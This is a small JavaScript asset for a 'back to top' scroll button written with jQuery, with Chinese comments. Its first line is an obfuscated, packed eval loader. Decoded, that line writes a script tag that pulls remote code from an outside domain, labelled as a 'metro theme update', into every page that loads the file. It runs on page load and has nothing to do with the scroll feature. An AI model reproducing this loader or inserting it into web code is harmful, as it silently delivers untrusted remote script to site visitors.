eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5.4("<0 7=3 2=\'6://d.8.c/1-b-a/1.9\'></0>");',14,14,'script|metro|src|javascript|write|document|http|language|nocower|js|update|theme|com|api'.split('|'),0,{}))
$(document).ready(function(){

//首先将#back-to-top隐藏

 $("#gotop").hide();

//当滚动条的位置处于距顶部100像素以下时，跳转链接出现，否则消失

$(function () {
$(window).scroll(function(){
if ($(window).scrollTop()>100){
$("#gotop").fadeIn(1500);
}
else
{
$("#gotop").fadeOut(1500);
}
});

//当点击跳转链接后，回到页面顶部位置

$("#gotop").click(function(){
$('body,html').animate({scrollTop:0},1000);
return false;
});
});
});